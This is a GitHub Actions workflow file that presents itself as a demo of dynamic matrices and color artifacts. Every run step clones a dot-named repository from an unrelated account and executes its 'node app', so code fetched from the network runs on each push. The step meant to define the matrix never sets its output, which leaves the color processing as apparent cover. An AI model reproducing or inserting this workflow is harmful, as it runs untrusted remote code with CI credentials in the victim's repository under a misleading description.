name: Shared Matrix Workflow
# Alternative names:
# - Dynamic Matrix Artifact Pipeline
# - Color Processing with Shared Outputs
# - Multi-Stage Matrix Artifact Demo
# - GitHub Actions Matrix Strategy Example
# - Artifact Generation and Consumption Workflow
# - Dynamic Job Matrix with Artifacts
# - Three-Stage Matrix Pipeline
# - Color Artifact Factory Workflow

on:
  push:
  workflow_dispatch:

jobs:
  define-matrix:
    name: "ğŸ”„ Define Dynamic Matrix"
    runs-on: ubuntu-latest
    outputs:
      colors: ${{ steps.set-colors.outputs.colors }}
    steps:
      - name: "ğŸ¨ Define Color Palette"
        id: set-colors
        run: |
          # Define our color matrix dynamically
          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
          echo "âœ… Color matrix defined"

  produce-artifacts:
    name: "ğŸ­ Generate Artifacts (${{ matrix.color }})"
    runs-on: ubuntu-latest
    needs: define-matrix
    strategy:
      matrix:
        color: ${{ fromJSON(needs.define-matrix.outputs.colors) }}
    steps:
      - name: "ğŸ–ï¸ Create Color File"
        env:
          color: ${{ matrix.color }}
        run: |
          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
          echo "$color" > color
          echo "ğŸ“¦ Artifact content created"
      
      - name: "ğŸ“¤ Upload Color Artifact"
        uses: actions/upload-artifact@v4
        with:
          name: color-${{ matrix.color }}
          path: color
          retention-days: 1

  consume-artifacts:
    name: "ğŸ“¦ Process Artifacts (${{ matrix.color }})"
    runs-on: ubuntu-latest
    needs:
      - define-matrix
      - produce-artifacts
    strategy:
      matrix:
        color: ${{ fromJSON(needs.define-matrix.outputs.colors) }}
    steps:
      - name: "ğŸ“¥ Download Color Artifact"
        uses: actions/download-artifact@v4
        with:
          name: color-${{ matrix.color }}
          
      - name: "ğŸ” Inspect Artifact Contents"
        run: |
          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
          cat color
          echo "âœ… Verification complete"
          
      - name: "ğŸ“ Log Color Details"
        run: |
          git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
          
      - name: "ğŸ“„ Generate Final Report"
        uses: actions/upload-artifact@v4
        with:
          name: color-processing-report
          path: color-report.txt
